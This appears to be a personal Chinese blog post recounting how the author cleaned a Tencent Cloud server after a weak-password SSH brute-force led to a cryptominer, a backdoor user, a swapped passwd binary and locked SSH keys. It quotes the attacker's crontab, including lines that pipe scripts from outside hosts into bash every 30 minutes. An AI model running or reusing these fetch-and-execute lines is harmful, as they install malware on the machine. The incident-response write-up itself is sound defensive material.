---
date: 2023-09-12
article: true
star: false
sticky: false
category:
  - 问题记录
tag:
  - 云服务器
  - 异常登录
  - 
---

# 记一次服务器被黑的解决过程

只能说离谱，以后还是要多注意这方面的东西。
<!-- more -->
---

一大早起来，就看到腾讯云异常登录的通知，就大概明白是咋回事了，这是我在腾讯云上的一个轻量应用服务器，倒也算不上第一次被黑，上一次被黑的时候入侵者仅仅只是放了一个挖矿木马就没了，其它什么也没动。这一次不仅搞挖矿把服务器资源都跑满了，而且还把我root用户的ssh密钥都改了，一大早起来就得赶紧解决。这里放一张图，看看资源使用情况，基本上都已经爆满了。

<img src="https://public-1308755698.cos.ap-chongqing.myqcloud.com//img/202309120816314.png" style="zoom: 80%;" />

## 原因

![](https://public-1308755698.cos.ap-chongqing.myqcloud.com//img/202309120919508.png)

究其原因，是因为在前几天为了在服务器上搭建自用的gitea，创建了一个新用户`git`来跑服务，也就是此次异常登录的用户，当时给它添加到了sudo组，而且也忘记做远程登录限制，也没有ssh密钥，密码也是非常简单的`123456`，被暴力破解应该是轻而易举的，只是没想到睡一觉起来就G了，以后在这一块看来是一点都不能松懈。下面是截取的一部分登录尝试记录。

```sh
$ lastb | grep git
gitlab-p ssh:notty    2.59.254.244     Tue Sep 12 04:16 - 04:16  (00:00)
gitlab-p ssh:notty    94.156.161.32    Tue Sep 12 01:35 - 01:35  (00:00)
gitlab-p ssh:notty    94.156.161.32    Tue Sep 12 01:35 - 01:35  (00:00)
git      ssh:notty    94.156.161.32    Tue Sep 12 01:34 - 01:34  (00:00)
git      ssh:notty    94.156.161.32    Tue Sep 12 01:34 - 01:34  (00:00)
git      ssh:notty    94.156.161.32    Tue Sep 12 01:33 - 01:33  (00:00)
...
```



## 解决

首先是之前的用户都登陆不上去了，这里只能用服务器默认用户在腾讯云后台重置密码，密码重置完后，登陆到服务器上，top看一下

![](https://public-1308755698.cos.ap-chongqing.myqcloud.com//img/202309120850327.png)

可以看到第一行xrx这个东西已经把cpu跑满了，内存也没剩下多少并且还多了一个cheeki用户。然后来看看这个玩意的运行路径

```sh
$ sudo ls -l /proc/19104/cwd
lrwxrwxrwx 1 root root 0 Sep 12 09:04 /proc/19104/cwd -> /root
```

再locate一下看看

```sh
$ locate xrx
/var/tmp/.xrx
/var/tmp/.xrx/chattr
/var/tmp/.xrx/config.json
/var/tmp/.xrx/init.sh
/var/tmp/.xrx/key
/var/tmp/.xrx/passwd
/var/tmp/.xrx/scp
/var/tmp/.xrx/uninstall.sh
/var/tmp/.xrx/xrx
```

其中这个`ini.sh`应该是被混淆过的，全是乱码，key文件和passwd可能是用来解码的。此时看下git用户的`.bash_history`都是我自己留下的记录，操作记录也是可以被隐藏的。目前root目录我是进不去的，直接把这个进程kill了也无济于事，一般来说会有定时任务来定时重启这些木马，查看系统定时任务，差不多就是特定的地方拉取脚本然后执行，并且在重启的时候还会后台运行这几个进程。

```sh
$ cat /etc/crontab
@daily root /var/tmp/.x/secure >/dev/null 2>&1 & disown  
@reboot root /var/tmp/.xrx/init.sh hide >/dev/null 2>&1 & disown  
1 * * * * root /var/tmp/.x/secure >/dev/null 2>&1 & disown  
*/30 * * * * root curl 179.43.142.41:1011/next | bash 
*/30 * * * * root curl load.whitesnake.church:1011/next | bash 
```

可以看到该文件修改时间就是凌晨一点，差不多就是我在睡觉的时候。

```sh
$ ls -l /etc/crontab
-rw-r--r-- 1 root root 305 Sep 12 01:36 /etc/crontab
```

差不多在同一时间，`/etc/passwd`文件也被修改了。

```sh
$ ls -l /etc/passwd
-rw-r--r-- 1 root root 2674 Sep 12 01:36 /etc/passwd
```

不幸的是，passwd命令也被掉包了，即便通过root权限，也无法直接修改用户的密码，而且我修改的密码可能会通过网络被上传到后台。

```sh
find /usr/bin/ -type f -mtime -3
/usr/bin/passwd
```

把盗版的passwd先删掉，然后用apt重新安装一个 

```sh
$ rm -f /usr/bin/passwd
$ sudo apt reinstall passwd
```

后面的任务是拿到root账号，这里通过腾讯云后台提供的重置密码功能，把root账号的密码给重置了，然后用默认账户登录上去再切换到root，可以看到密钥已经被改了，修改时间也是凌晨

```sh
$ ls -l
total 12
-rwxr-xr-x 1 root root  388 Sep 12 01:35 authorized_keys
-rw------- 1 root root 2610 Apr  8 21:30 id_rsa
-rw-r--r-- 1 root root  573 Apr  8 21:30 id_rsa.pub
```

并且还上锁了，无法删除

```sh
rm authorized_keys
rm: cannot remove 'authorized_keys': Operation not permitted
```

尝试解锁后成功了，庆幸没有对方修改chattr命令。

```sh
ls -l chattr
-rwxr-xr-x 1 root root 14656 Jun  2  2022 chattr
```

```sh
chattr -iad authorized_keys
```

把所有密钥都删除，然后再删除木马文件和定时任务，然后再重启看看，是否恢复正常。

``` sh
$ rm -rf /var/tmp/.xrx/
$ echo "" > /etc/crontab
```

删除之后的话基本上服务器占用就变正常了，为了彻底解决，这里把ssh的配置设置的更加严格一些，禁止密码登录，禁止root登录，修改ssh默认端口号。差不多后续就不会出什么问题了，除非有什么其它软件漏洞。下面是修改后的占用图，就是正常状态了。

<img src="https://public-1308755698.cos.ap-chongqing.myqcloud.com//img/202309121531013.png" style="zoom:80%;" />



下面是一些用到的文章

- [Linux系统是否被植入木马的排查流程梳理-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1026521?areaId=106001)

- [Linux服务器被黑 排查思路(上)-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1828412)